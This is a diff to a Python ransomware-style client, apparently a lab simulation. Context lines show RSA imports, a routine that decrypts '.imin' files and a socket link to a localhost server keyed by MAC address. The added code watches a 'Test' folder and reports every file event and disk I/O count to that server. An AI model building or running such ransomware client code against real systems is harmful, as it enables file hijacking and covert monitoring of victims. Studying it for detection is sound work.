@@ -11,6 +11,10 @@ import uuid
 from interface import App
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+import time
+import psutil
+from watchdog.observers import Observer
+from watchdog.events import PatternMatchingEventHandler
 
 '''
     Function to recursively scan a directory and give a list of filepaths
@@ -117,9 +121,53 @@ def decryptFiles(key):
         if extension == '.imin':
             decrypt(filePath, key)
 
+def on_created(event):
+     opt = f"{event.src_path} create"
+     io = psutil.disk_io_counters(perdisk=False)
+     timestamp = time.time()
+     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
+
+def on_deleted(event):
+     opt = f"{event.src_path} delete"
+     io = psutil.disk_io_counters(perdisk=False)
+     timestamp = time.time()
+     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
+ 
+def on_modified(event):
+     opt = f"{event.src_path} modify"
+     io = psutil.disk_io_counters(perdisk=False)
+     timestamp = time.time()
+     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
+ 
+def on_moved(event):
+     opt = f"{event.src_path} move"
+     io = psutil.disk_io_counters(perdisk=False)
+     timestamp = time.time()
+     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
+
+
+
 if __name__ == "__main__":
     # using MAC address as an ID for the server
     MESSAGE = hex(uuid.getnode())
+   
+    patterns = ["*"]
+    ignore_patterns = None
+    ignore_directories = False
+    case_sensitive = True
+    my_event_handler = PatternMatchingEventHandler(patterns, ignore_patterns, ignore_directories, case_sensitive)
+    
+    my_event_handler.on_created = on_created
+    my_event_handler.on_deleted = on_deleted
+    my_event_handler.on_modified = on_modified
+    my_event_handler.on_moved = on_moved
+
+    path = "Test"
+    go_recursively = True
+    my_observer = Observer()
+    my_observer.schedule(my_event_handler, path, recursive=go_recursively)
+
+    my_observer.start()
 
     # hardcoded IP and Port
     HOST = 'localhost'
@@ -150,6 +198,7 @@ if __name__ == "__main__":
         print(e)
     print('Connected!')
     secSock.send(bytes(PACKAGE, "utf-8"))
+
 
     while True:
         read_sockets, write_sockets, error_sockets = select.select([secSock], [], [])
